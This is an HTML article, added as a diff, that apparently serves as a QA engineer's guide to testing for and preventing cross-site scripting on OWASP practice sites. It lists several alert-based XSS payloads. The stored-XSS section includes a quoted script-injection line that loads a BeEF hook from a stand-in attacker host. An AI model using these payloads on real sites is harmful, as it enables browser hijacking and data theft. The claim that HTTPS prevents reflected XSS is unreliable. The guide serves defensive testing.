@@ -1,0 +1,519 @@
+<div id="toc" class="toc">
+<div id="toctitle">Table of Contents</div>
+<ul class="sectlevel1">
+<li><a href="#_what_is_xss">What is XSS?</a></li>
+<li><a href="#_why_do_we_need_to_test_for_xss_vulnerabilities">Why do we need to test for XSS vulnerabilities?</a></li>
+<li><a href="#_how_do_we_test_for_xss_vulnerabilities">How do we test for XSS vulnerabilities?</a>
+<ul class="sectlevel2">
+<li><a href="#_testing_for_dom_based_xss">Testing for DOM-based XSS</a></li>
+<li><a href="#_testing_for_reflected_xss">Testing for reflected XSS</a></li>
+<li><a href="#_testing_for_stored_xss">Testing for stored XSS</a></li>
+</ul>
+</li>
+<li><a href="#_how_do_we_prevent_or_fix_xss_vulnerabilities">How do we prevent or fix XSS vulnerabilities?</a></li>
+<li><a href="#_summary">Summary</a></li>
+</ul>
+</div>
+<div class="paragraph">
+<p>I decided to write this article because despite XSS being a common and older vulnerability, many QA and developers know very little about it, what it really is, how to test for or fix it. Probably you&#8217;ve heard of XSS before, but don&#8217;t really know much about it. You may be wondering what Cross-Site
+Scripting is, why you should test for it, or why it&#8217;s important. Don&#8217;t worry, we will cover everything you need to know in this article. By the end, you will have a general understanding of XSS, how to check for it, and how to
+prevent it.<br>
+In this article, we will address the following topics:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>What is XSS?</p>
+</li>
+<li>
+<p>Why do you need to test for XSS vulnerabilities?</p>
+</li>
+<li>
+<p>How to test for XSS?</p>
+</li>
+<li>
+<p>Prevention methods</p>
+</li>
+<li>
+<p>Summary</p>
+</li>
+</ul>
+</div>
+<div class="sect1">
+<h2 id="_what_is_xss">What is XSS?</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>In short, XSS is a security vulnerability where an attacker injects their own
+client-side scripts into a site.</p>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s take a look at a typical case for an XSS vulnerability using the image below and discuss what we see on it.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da1e179ca5c5487ce23_wIU_4DfFrUMKTwmIM7qoJSGOR9zFJT8xS0FXJz3_flyDEYSOWyN137EA2lJmuPI4s2Mw7daOOl_g0QfYvvJMZqQtWPvKwKyClFUjdyA3Bvc59tEEKDliYDnUABlaSQm-IVntwATa.png" alt="5f366da1e179ca5c5487ce23 wIU 4DfFrUMKTwmIM7qoJSGOR9zFJT8xS0FXJz3 flyDEYSOWyN137EA2lJmuPI4s2Mw7daOOl g0QfYvvJMZqQtWPvKwKyClFUjdyA3Bvc59tEEKDliYDnUABlaSQm IVntwATa">
+</div>
+<div class="title"><em>A visual representation of a typical XSS attack flow via email</em></div>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Here, we have a case where an attacker has modified a link with malicious content. As an example, we can say the link is for a video sharing site and has a keylogger attached to it. The attacker emails it to an unsuspecting victim with an intriguing title 'Cutest cat ever'.</p>
+</li>
+<li>
+<p>The victim opens the email and clicks the link.</p>
+</li>
+<li>
+<p>The user is redirected to the actual video sharing site, and probably to a cute cat video. What the user doesn&#8217;t know is that a keylogger is being executed. Now anything the user types will be sent to an unknown attacker.</p>
+</li>
+<li>
+<p>The data from the keylogger is sent to the attacker.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>Okay, so that&#8217;s an interesting case for spam emails, but many people know not to select links from unknown senders today, right? Let&#8217;s look at one more typical case.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da141480acf2ab8f9d4_ffCbT9ZWavqT3EnWuEmoblsHmGseY8uqtM8CndDGIgmdy-2oWNMFrfKu8fuAZNddYwzskMn1suqfaCkQeVepV1hrbDdT6hL50W5_EP1rfk4AGE6bV5vPJbz5aqhe3y4sJWuXTZ5J.png" alt="5f366da141480acf2ab8f9d4 ffCbT9ZWavqT3EnWuEmoblsHmGseY8uqtM8CndDGIgmdy 2oWNMFrfKu8fuAZNddYwzskMn1suqfaCkQeVepV1hrbDdT6hL50W5 EP1rfk4AGE6bV5vPJbz5aqhe3y4sJWuXTZ5J">
+</div>
+<div class="title"><em>An example of a stored XSS attack flow.</em></div>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>In this situation, an attacker posts a comment on a site (such as a forum or social media page) which
+contains malicious code.</p>
+</li>
+<li>
+<p>The malicious code is saved to the site&#8217;s database.</p>
+</li>
+<li>
+<p>Later, a user visits the infected page.</p>
+</li>
+<li>
+<p>The user&#8217;s browser runs the malicious script.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>XSS can be broken down into three main types:<br>
+DOM-based XSS (common):</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Attack is executed as a result of modifying the DOM.</p>
+</li>
+<li>
+<p>Attacker modifies the client-side code.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>Reflected XSS (most common):</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Attacker modifies the webpage HTTP request with malicious content.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>Stored XSS (most severe):</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Attacker saves malicious content on the site&#8217;s DB which can be run by other users.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>For this article, we are going to focus on the basic flows for manual testing each type of XSS
+vulnerability.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da25c702f8d7932f10a_4VQSX6wMY9roBktyIlD8TFERsNjpn-wDevjm5TMZQtCvpqXlOtm8qMaoaU0QKgcBQ8JwDL1xUL7IlTgx4BAz1CVLC0otC6MbX6PrSaY0DxDlJPupEO_uoPaB02gU2p0S3MP2_bW4.png" alt="5f366da25c702f8d7932f10a 4VQSX6wMY9roBktyIlD8TFERsNjpn wDevjm5TMZQtCvpqXlOtm8qMaoaU0QKgcBQ8JwDL1xUL7IlTgx4BAz1CVLC0otC6MbX6PrSaY0DxDlJPupEO uoPaB02gU2p0S3MP2 bW4">
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_why_do_we_need_to_test_for_xss_vulnerabilities">Why do we need to test for XSS vulnerabilities?</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Cross-site scripting is nothing new, yet it remains a very common security vulnerability. It consistently gets itself on the <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP
+Top 10 Web Application Security Risks</a>.<br>
+XSS attacks can be used to:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Steal user data</p>
+</li>
+<li>
+<p>Escalate privileges</p>
+</li>
+<li>
+<p>Add a keylogger</p>
+</li>
+<li>
+<p>Hijack accounts</p>
+</li>
+<li>
+<p>Distribute a virus</p>
+</li>
+<li>
+<p>Change a site&#8217;s layout</p>
+</li>
+<li>
+<p>Add a trojan login panel</p>
+</li>
+<li>
+<p>And many other client-side attacks</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>Potential costs of XSS vulnerabilities:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Loss of money</p>
+</li>
+<li>
+<p>Loss of customers</p>
+</li>
+<li>
+<p>Reputation</p>
+</li>
+<li>
+<p>Loss of sales</p>
+</li>
+<li>
+<p>Data theft</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>The cost of an XSS vulnerability can be hard to gauge as it could be different for different sites.<br>
+As an example, let&#8217;s say we have an e-commerce store with an unprotected comments section for each product. An attacker leaves a comment with a malicious link to another product on the site. Now, any user who selects this link will execute the malicious code. If this code were a keylogger, then the users potentially give away their login to the site, their credit/debit card information, their address, and other personal information. Because users will now see the site as unsafe and possibly had their information or even money stolen, the potential costs here could be loss of reputation, loss of customers, data theft (for customers), loss of sales, and ultimately loss of money.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_how_do_we_test_for_xss_vulnerabilities">How do we test for XSS vulnerabilities?</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>There are two ways to test for these risks, manually or with automated tools.</p>
+</div>
+<div class="paragraph">
+<p>Testing manually can be very time-consuming, difficult, and somewhat unreliable. However, it&#8217;s a good place to start, especially if you don&#8217;t have access to the tools you need.</p>
+</div>
+<div class="paragraph">
+<p>Automated tools are very useful in identifying possible vulnerabilities as well as testing browser hijacking. There are many tools available for this, but many of them are not free and can be quite expensive. Luckily, there are two free tools available which will cover your XSS testing needs:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><a href="https://www.zaproxy.org/" target="_blank" rel="noopener">OWASP ZAP</a> (Zed Attack Proxy) - a free tool provided by OWASP. It has a combination of built-in tools and can be used for manual or automated testing.</p>
+</li>
+<li>
+<p><a href="https://beefproject.com/" target="_blank" rel="noopener">BeEF</a> (Browser Exploitation Framework Project) - a free
+pentesting tool which focuses on testing the web browser.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>We also need to note that you should never run actually malicious code or code that you don&#8217;t understand. Always use harmless code which you fully understand.</p>
+</div>
+<div class="paragraph">
+<p>Now, let&#8217;s proceed with learning how to test for each type of XSS vulnerability, as promised.</p>
+</div>
+<div class="sect2">
+<h3 id="_testing_for_dom_based_xss">Testing for DOM-based XSS</h3>
+<div class="paragraph">
+<p>Let&#8217;s see how to test for DOM-based XSS by becoming the attacker. The first thing you need to do is look for an input field. This could be a comments section, search bar, or any place where the input is displayed after submission. Then, just type something that&#8217;s expected for this field (i.e. a typical search or comment) and check the normal output. Next, make a series of submissions with different scripts attached and check the output against the original. It&#8217;s best to start with something simple, like <strong>&lt;h1&gt;</strong> as it will tell you if the field allows special characters and runs the user&#8217;s HTML. Repeat this process until you either find a vulnerability or are satisfied that the input isn&#8217;t at risk.<br>
+Let&#8217;s take this one step further by breaking down each step while looking at an example. For this example, we decided to use an application provided by OWASP called OWASP Juice Shop. It is set up like a typical e-commerce site.<br>
+<strong>Step 1: Find an input field.</strong></p>
+</div>
+<div class="paragraph">
+<p>Here we can see that there&#8217;s a search bar, we will start there.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da269768da8652a4b39__rGoPEGzFyxyZfRxAPaAsAgFeer9ZjcXrmZQBXODWWNeRWCQBS7X6MaaQL6eoMNTZiAVh0BWZ-HmDJBSyu696jhvp20ybhR8cz35roiIbOu-Af-RIbTi2Wy4EXb_XyC4NpfpcpNM.png" alt="5f366da269768da8652a4b39  rGoPEGzFyxyZfRxAPaAsAgFeer9ZjcXrmZQBXODWWNeRWCQBS7X6MaaQL6eoMNTZiAVh0BWZ HmDJBSyu696jhvp20ybhR8cz35roiIbOu Af RIbTi2Wy4EXb XyC4NpfpcpNM">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Step 2: Check the normal output of this field.</strong><br>
+We&#8217;ll make a simple search for "apple" and check the output.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da150972d7e426336cc_sWeKBHf3Sucw3O2yDL9Hz0LNZRp9xs9undm-ScSGZXJa9b4vMHOnYWq9NJM9rayLLzukqeRyLvqRLBa0wMFdVG3YCdgnRm5TNreMxir-OpzbZLcnSKN__GfJbj9ZUBdJLtlZumez.png" alt="5f366da150972d7e426336cc sWeKBHf3Sucw3O2yDL9Hz0LNZRp9xs9undm ScSGZXJa9b4vMHOnYWq9NJM9rayLLzukqeRyLvqRLBa0wMFdVG3YCdgnRm5TNreMxir OpzbZLcnSKN  GfJbj9ZUBdJLtlZumez">
+</div>
+</div>
+<div class="paragraph">
+<p><strong>Step 3: Try a simple HTML tag</strong>.<br>
+Now, we will slightly change our search to <strong>&lt;h1&gt; apple</strong>. This is a quick way to determine if an input needs further testing. If the output is modified, then there is a high probability that more complex scripts will run. That being said, a lack of change in the output doesn&#8217;t mean that the input is safe.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da22add8d19a1319043_Z3CqftxBaSp5UAk4auW7R0_3SZPh54GMlwAX5deX21wuhB-VOQjn-p7vKfn33DKQwbyQ6g3RsDHqF7vx_EkA8x-nPnnkOX9epjEcmDLJj4xh3oh05cWtsV9z2RsHooALYKAcN_E3.png" alt="5f366da22add8d19a1319043 Z3CqftxBaSp5UAk4auW7R0 3SZPh54GMlwAX5deX21wuhB VOQjn p7vKfn33DKQwbyQ6g3RsDHqF7vx EkA8x nPnnkOX9epjEcmDLJj4xh3oh05cWtsV9z2RsHooALYKAcN E3">
+</div>
+</div>
+<div class="paragraph">
+<p>Look at that! The output is different than before! This tells us that we definitely
+need to spend more time testing this input.<br>
+<strong>Step 4: Try more complex scripts</strong>.</p>
+</div>
+<div class="paragraph">
+<p>Now that we have a good reason to continue testing this input, let&#8217;s try again with another script. There are many scripts you could choose from, but I find that it&#8217;s easier to use those which will produce an alert on the screen. That is why we will try <strong>&lt;script&gt; alert("XSS")&lt;/script&gt; apple</strong>.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da1de3f7057cde5ffda_ipDUDgMKrmu9YCYviBAJg5qmOQIjC6CACi2s4pEtTrmRYGcN5TlgaNbCVzQ3k2msXX6skGxkn8v-bD7rfLsm1TBIkN7PlCCGuNwz3rp56i-XL44StyIyx_7EhMKzJlev6_3QKJrw.png" alt="5f366da1de3f7057cde5ffda ipDUDgMKrmu9YCYviBAJg5qmOQIjC6CACi2s4pEtTrmRYGcN5TlgaNbCVzQ3k2msXX6skGxkn8v bD7rfLsm1TBIkN7PlCCGuNwz3rp56i XL44StyIyx 7EhMKzJlev6 3QKJrw">
+</div>
+</div>
+<div class="paragraph">
+<p>Ok, so that didn&#8217;t work. But we can&#8217;t give up so easily. Let&#8217;s try another!<br>
+<strong>Repeat Step 4: Try another script</strong>.<br>
+This time we&#8217;ll try <strong>&lt;img src="" onerror=alert('XSS')&gt; apple</strong>.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da2ef0245316890163b_cDFHUZwHZoaS-NMMRKBTJ8xfS5s7-4Hah3s-nW4ajFoIwcTMt1BS11ZHMHFnrK1pbXXb382dtcJoA-cT9pjUrNNezn5WKGf8Mb5FQPvIRVQj1gSO2QeGebJ5WvzWvjbtKKOiApAD.png" alt="5f366da2ef0245316890163b cDFHUZwHZoaS NMMRKBTJ8xfS5s7 4Hah3s nW4ajFoIwcTMt1BS11ZHMHFnrK1pbXXb382dtcJoA cT9pjUrNNezn5WKGf8Mb5FQPvIRVQj1gSO2QeGebJ5WvzWvjbtKKOiApAD">
+</div>
+</div>
+<div class="paragraph">
+<p>Woah! Notice how this time we were able to add a broken image to the page. That&#8217;s great, but our alert still didn&#8217;t appear. We need to keep trying.<br>
+<strong>Repeat Step 4: Try another script</strong>.</p>
+</div>
+<div class="paragraph">
+<p>Now we will try <strong>&lt;iframe src="javascript:alert(<code>xss</code>)"&gt; apple</strong>.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da2fa45d01b8d8eea65_gk8HsgxR5pkEkZPja5L00dmGwEV4bAImkUIXjBEUEg8csKO1p2z69xz3tJCrNzS5HPtND3DHTX0008HVwzM5YHZKjuacOWr1JmD8_DMmmAx_xXr_9OM5_P5-NTzQYDD4gcu-OZnk.png" alt="5f366da2fa45d01b8d8eea65 gk8HsgxR5pkEkZPja5L00dmGwEV4bAImkUIXjBEUEg8csKO1p2z69xz3tJCrNzS5HPtND3DHTX0008HVwzM5YHZKjuacOWr1JmD8 DMmmAx xXr 9OM5 P5 NTzQYDD4gcu OZnk">
+</div>
+</div>
+<div class="paragraph">
+<p>Finally! We have injected an iframe into the DOM and successfully run the corresponding alert script.</p>
+</div>
+<div class="paragraph">
+<p>If you look closely at the scripts we used, you&#8217;ll notice that we used different combinations of single quotes, double quotes, and back-ticks.</p>
+</div>
+<div class="paragraph">
+<p>&lt;script&gt; alert("XSS") &lt;/script&gt;</p>
+</div>
+<div class="paragraph">
+<p>&lt;img src="" onerror=alert('XSS')&gt;</p>
+</div>
+<div class="paragraph">
+<p>&lt;iframe src="javascript:alert(<code>xss</code>)"&gt;</p>
+</div>
+<div class="paragraph">
+<p>This isn&#8217;t just for fun, sometimes every detail matters, including font! That&#8217;s why it&#8217;s best to start small - you never know which characters will be accepted. If you want to try this for yourself, you can practice the same example on the <a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener">OWASP Juice Shop</a> testing site.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_testing_for_reflected_xss">Testing for reflected XSS</h3>
+<div class="paragraph">
+<p>For reflected XSS, we need to find places where user input is reflected on the page. Next, test it&#8217;s normal output. Then, slowly try to manipulate these variables (or even the URL itself) until you succeed or are satisfied that there isn&#8217;t a vulnerability.<br>
+Let&#8217;s take a look at an example.<br>
+<strong>Step 1: Find an input field or URL variable which reflects user input.<br>
+Step 2: Check the normal output.</strong></p>
+</div>
+<div class="paragraph">
+<p>Here we have a simple site which welcomes the user with their name and displays a link.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f366da33bea2a7a56161e53_hxunvZOnEKcFVPiMzrLx-EBdYsyOYwtgCL70MhI3FnOw4ZFvuRnm6Sz4vittiPCOr0WzOV60dRycPJxvgls9NYs-GlUBFAbEKeCY-or9gEUKDgwP_ExOLwurHEN1gFpkXPKxy2nM.png" alt="5f366da33bea2a7a56161e53 hxunvZOnEKcFVPiMzrLx EBdYsyOYwtgCL70MhI3FnOw4ZFvuRnm6Sz4vittiPCOr0WzOV60dRycPJxvgls9NYs GlUBFAbEKeCY or9gEUKDgwP ExOLwurHEN1gFpkXPKxy2nM">
+</div>
+<div class="title"><em>This example is provided by the <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">OWASP testing guide</a></em>.</div>
+</div>
+<div class="paragraph">
+<p>"We can see already that there&#8217;s a variable (query parameter) in the HTTP request which is
+displayed on the <strong>page(user=MySmith)</strong> - we will start by using this variable to attack the
+page.</p>
+</div>
+<div class="paragraph">
+<p><strong>Step 3: Try something simple.</strong></p>
+</div>
+<div class="paragraph">
+<p>As with DOM XSS, start small and simple."<br>
+<strong>Step 4: Try something more complex.</strong></p>
+</div>
+<div class="paragraph">
+<p>Now we&#8217;ll try more complex scripts and check the output. For this example, we will modify the URL directly, rather than messing with the input field. We will replace <strong>user=MrSmith" with "user=&lt;script&gt; alert(123)&lt;/script&gt;</strong>.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="assets/articles/cross-site-scripting-xss-a-qa-engineers-guide/5f3a386d18ce2431beea9182_Screenshot%20(4).png" alt="5f3a386d18ce2431beea9182 Screenshot%20(4)">
+</div>
+<div class="title"><em>This example is provided by the <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">OWASP     testing guide</a></em>.</div>
+</div>
+<div class="paragraph">
+<p>"Success! As you can see, the script was executed in the user&#8217;s browser. We also want to
+draw your attention to the fact that the original webpage looks normal - a user would have no idea they
+executed malicious code if we weren&#8217;t using an alert function.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_testing_for_stored_xss">Testing for stored XSS</h3>
+<div class="paragraph">
+<p>The steps for testing stored XSS are pretty much the same as for DOM-based XSS.<br>
+<strong>Step 1: Find an input field.</strong><br>
+<strong>Step 2: Check the normal output of this field.</strong><br>
+<strong>Step 3: Try something simple.<br>
+Step 4: Try more complex scripts, repeat.</strong><br></p>
+</div>
+<div class="paragraph">
+<p>In general, you should check:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Any place where user input is saved to the DB (like user profiles, comments, file uploads, shopping
+carts)</p>
+</li>
+<li>
+<p>GET, POST, PUT requests</p>
+</li>
+<li>
+<p>The ability to manipulate the page&#8217;s HTML</p>
+</li>
+<li>
+<p>The ability to store malicious content somewhere public</p>
+</li>
+<li>
+<p>The ability to replace the page&#8217;s links</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s take a look at one example of a test using the BeEF tool, which was provided by the <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">OWASP testing guide</a>. A typical test scenario would be:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Injecting a JavaScript hook which communicates to the attacker&#8217;s browser exploitation framework (BeEF). Example BeEF Injection in index2.php can be:</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p><a href="mailto:email@test.com">email@test.com</a>”&gt;&lt;script src=http://attackersite/beef/hook/beefmagic.js.php&gt;&lt;/script&gt;</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Waiting for the application user to view the vulnerable page where the stored input is displayed</p>
+</li>
+<li>
+<p>Control the application user&#8217;s browser via the BeEF console</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>With the example above, an attacker could add a script to their own email on the webpage. This could possibly be done during registration or with updating a user profile. Then, any user who views a page, that runs this malicious code, is now a potential victim as their browsers can now be controlled by the attacker.</p>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_how_do_we_prevent_or_fix_xss_vulnerabilities">How do we prevent or fix XSS vulnerabilities?</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>There are many different ways to prevent such vulnerabilities. You will need to choose based on your project and it&#8217;s needs. The best defense is a combination of methods.</p>
+</div>
+<div class="paragraph">
+<p><strong>Prevention methods</strong>:</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p><strong>#1 rule: Don&#8217;t trust your users!</strong> Trusting users, even logged-in or admin users, leads to
+many security vulnerabilities - just don&#8217;t do it. What do I mean when I say not to trust the users? I mean that you should treat all fields as potential attack targets. Maybe there is a field or form that only an app admin can access - who is this admin? Do you know how secure their password is? You don&#8217;t know - and there is always the possibility that this admin, or an attacker who stole the admin&#8217;s login credentials, could place malicious code anywhere. So, protect all inputs and treat all users as a possible threat.</p>
+</li>
+<li>
+<p>*Enable a Content Security Policy (<a href="https://content-security-policy.com/" target="_blank" rel="noopener">CSP</a>) - an HTTP response header that works to reduce the risk of XSS vulnerabilities.</p>
+</li>
+<li>
+<p><strong>Use frameworks and/or libraries</strong>. Many modern frameworks and libraries have built-in
+security to reduce XSS risks.</p>
+</li>
+<li>
+<p><a href="https://en.wikipedia.org/wiki/Escape_character"><strong>Escape</strong></a> <strong>special characters</strong> - replace them with something else which prevents the malicious code from running.</p>
+</li>
+<li>
+<p><strong>Encode data</strong></p>
+</li>
+<li>
+<p><strong>Filter data on input</strong> to remove dangerous content before saving it to the database.</p>
+</li>
+<li>
+<p><a href="https://wiki.sei.cmu.edu/confluence/display/java/Input+Validation+and+Data+Sanitization" target="_blank" rel="noopener"><strong>Sanitize</strong></a> data (on input and output)* to ensure that the passed data meets security requirements
+by means of removing, escaping, encoding, or replacing special characters. It&#8217;s important to sanitize data on input to prevent saving malicious content to the database and on output to prevent malicious code execution in the browser.</p>
+</li>
+<li>
+<p><strong>Use HTTPS header instead of HTTP</strong>. Hint: the 'S' means 'Secure'. This protection is
+excellent for preventing reflected XSS vulnerabilities.</p>
+</li>
+<li>
+<p><strong>Protect cookies with 'secure' and 'HTTPonly'.</strong></p>
+</li>
+<li>
+<p><strong>Use black lists or white lists.</strong> It&#8217;s better to use whitelisting because it&#8217;s impossible
+to blacklist all unwanted content.</p>
+</li>
+<li>
+<p>And many other options&#8230;&#8203; Here at Valor Software, we use a unique combination of protection methods for each project, based on needs, to ensure stable security for our customers.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>It&#8217;s important to use a combination of prevention methods to ensure your site is secure. Using only one or two methods isn&#8217;t enough. For example, character escaping can be seen by the attacker, and with time they could find a way to bypass the escaping method. So, it&#8217;s why you need a combination of protection methods on user input and output.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_summary">Summary</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Let&#8217;s sum up everything.</p>
+</div>
+<div class="paragraph">
+<p>XSS is a common and serious security vulnerability. We covered what XSS can be used to do, how XSS can harm a person, or business, and what the potential costs are. We took a look at the three main types of XSS vulnerabilities, how they work, and how to test for them.</p>
+</div>
+<div class="paragraph">
+<p>General manual testing flow for various XSS vulnerabilities is:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Find an input field.</p>
+</li>
+<li>
+<p>Check normal output.</p>
+</li>
+<li>
+<p>Check output with code - remembering to start small.</p>
+</li>
+<li>
+<p>Repeat with other codes until success or you&#8217;re confident in the level of security.</p>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>We also discussed, and perhaps experienced, how manual security testing is very time-consuming, so it&#8217;s best to use automated tools whenever possible. Finally, we reviewed XSS prevention methods and why the best protection is a combination of several methods.<br>
+As promised, you should now have a general understanding of this vulnerability, how to test for it, and how to prevent it.</p>
+</div>
+</div>
+</div>
